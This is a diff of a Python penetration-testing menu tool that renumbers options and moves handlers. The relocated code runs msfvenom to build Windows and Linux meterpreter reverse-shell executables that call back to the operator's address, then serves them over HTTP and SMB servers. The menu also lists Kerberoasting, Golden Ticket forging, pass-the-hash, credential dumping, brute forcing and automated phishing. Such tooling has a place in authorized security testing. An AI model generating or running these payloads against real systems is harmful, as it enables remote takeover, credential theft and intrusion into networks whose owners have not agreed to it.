@@ -538,16 +538,16 @@ def display():
    
 def options():
    print('\u2551' + "(01) Re/Set DNS  SERVER (12) Synchronize Time (23) Get Arch (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Whois DNS SERVER (24) Net View (35) Look up SecIDs (46) KerberoFilter (57) *BloodHound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) dig   DNS SERVER (25) Services (36) Sam Dump Users (47) KerberosBrute (58) *BH  ACLPWN (69) Editor HASH (80) Hydra  SMB (91) SSHKeyID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Recon DNS SERVER (26) AT  Exec (37) REGistry Hives (48) Kerberoasting (59) SecretsDump (70) Editor HOST (81) Hydra POP3 (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) Dump  DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra HTTP (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF  SHELL (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Create  Exploits (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Start HTTPServer (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Start SMB Server (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Compile Exploits (24) Net View (35) Look up SecIDs (46) KerberoFilter (57) *BloodHound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start HTTPServer (25) Services (36) Sam Dump Users (47) KerberosBrute (58) *BH  ACLPWN (69) Editor HASH (80) Hydra  SMB (91) SSHKeyID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start SMB Server (26) AT  Exec (37) REGistry Hives (48) Kerberoasting (59) SecretsDump (70) Editor HOST (81) Hydra POP3 (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra HTTP (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF  SHELL (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -1146,6 +1146,72 @@ while True:
          print("[-] Server synchronisation did not occur...")
                  
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Create locally defined exploit files.
+# Details : 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '13':
+      num = input("[*] Please specify listening port :")
+      
+      if num.isdigit():
+         print("[*] Creating exploits please wait...")
+         command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=" + num + " --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp LHOST="     + localIP + " LPORT=" + num + " --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
+         command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x64 -f elf -o "   + httpDir + "/linshell64.elf > /dev/null 2>&1")
+         command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x86 -f elf -o "   + httpDir + "/linshell32.elf > /dev/null 2>&1")
+      else:
+         print("[-] Sorry, I do not understand...")
+
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Start HTTP server.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '14':
+      num = input("[*] Please specify listening port :")
+      
+      if num.isdigit():
+         print("[*] Starting HTTP server...")
+      
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'python3 -m http.server " + num + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")      
+      else:
+         print("[-] Sorry, I do not understand...")
+      
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Start SMB server.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '15':
+      print("[*] Starting SMB server...")
+
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")
+            
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1155,7 +1221,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '13':
+   if selection == '16':
       if DNS[:5] == "EMPTY":
          print("[-] DNS has not been specified...")
          checkParams = 1      
@@ -1173,7 +1239,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '14':
+   if selection == '17':
       if DNS[:5] == "EMPTY":
          print("[-] DNS has not been specified...")
          checkParams = 1
@@ -1191,7 +1257,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '15':
+   if selection == '18':
       if DOM[:5] == "EMPTY":
          print("[-] Domain has not been specified...")
          checkParams = 1
@@ -1209,7 +1275,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '16':
+   if selection == '19':
       checkParams = testTwo()      
                
       if USR[:2] == "''":
@@ -1234,7 +1300,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '17':
+   if selection == '20':
       checkParams = testOne()      
       
       if checkParams != 1:
@@ -1258,7 +1324,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '18':
+   if selection == '21':
       checkParams = testOne()  
       
       if checkParams != 1:
@@ -1278,77 +1344,11 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '19':
+   if selection == '22':
       checkParams = testTwo()
       
       if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Create locally defined exploit files.
-# Details : 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '20':
-      num = input("[*] Please specify listening port :")
-      
-      if num.isdigit():
-         print("[*] Creating exploits please wait...")
-         command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=" + num + " --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_tcp LHOST="     + localIP + " LPORT=" + num + " --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
-         command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x64 -f elf -o "   + httpDir + "/linshell64.elf > /dev/null 2>&1")
-         command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x86 -f elf -o "   + httpDir + "/linshell32.elf > /dev/null 2>&1")
-      else:
-         print("[-] Sorry, I do not understand...")
-
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Start HTTP server.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '21':
-      num = input("[*] Please specify listening port :")
-      
-      if num.isdigit():
-         print("[*] Starting HTTP server...")
-      
-         command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'python3 -m http.server " + num + "'; xdotool key Return"); time.sleep(1)
-         command("xdotool key Ctrl+Tab")      
-      else:
-         print("[-] Sorry, I do not understand...")
-      
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Start SMB server.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '22':
-      print("[*] Starting SMB server...")
-
-      command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return"); time.sleep(1)
-      command("xdotool key Ctrl+Tab")
-            
       prompt()
       
 # ------------------------------------------------------------------------------------- 
